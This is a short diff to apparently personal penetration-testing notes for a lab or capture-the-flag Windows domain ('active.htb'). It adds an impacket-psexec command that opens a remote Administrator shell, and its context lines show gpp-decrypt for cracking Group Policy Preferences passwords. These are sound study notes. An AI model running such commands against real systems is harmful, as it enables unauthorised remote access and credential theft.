@@ -158,6 +158,9 @@ be sure to try a password that might fit in a password policy
 ### Cracking GPP Password/Hash
 this is some sort of cpassword or something
 
+### PSExec Usage
+`impacket-psexec active.htb/Administrator@10.10.10.100`
+
 `gpp-decrypt <hash>`
 
 # AD Enumeration (Post Compromise)
